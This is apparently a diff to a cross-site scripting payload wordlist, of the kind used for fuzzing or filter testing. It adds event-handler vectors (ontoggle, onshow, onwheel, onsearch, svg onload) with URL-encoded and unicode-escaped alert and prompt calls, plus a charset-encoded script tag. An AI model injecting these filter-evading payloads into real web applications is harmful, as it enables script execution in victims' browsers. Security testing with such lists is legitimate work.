@@ -1142,5 +1142,17 @@ with(document)body.appendChild(createElement('iframe onload=&#97&#108&#101&#114&
 /textarea><script>alert(1)</script>
 <image src=`` onerror=setTimeout/*("__")*/`\u0061lert\u00281\u0029/**/`>
 <script id=x>x.removeAttributeNode(document.createAttribute(status))</script>
-<meta http-equiv="X-UA-Compa"content="x=edge"><svg onload=document.styleSheets[0].addRule("x",0);><switch/><style>*:after{content:counter(x)
+<pre style=line-height:1><script>d=document;for(i=1;i<4001;i++){d.write(Math.random()<.5?"\u2571":"\u2572");d.write(i%80?"":"\n")}</script>
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+<body style="height:1000px" onwheel="[DATA]">
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+<svg+onload=+"[DATA]"
+<svg+onload=+"aler%25%37%34(1)"
+¼script¾alert(¢xss¢)¼/script¾
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+<input type="search" onsearch="aler\u0074(1)">
+<details ontoggle="aler\u0074(1)">
 /* RFI STOP */
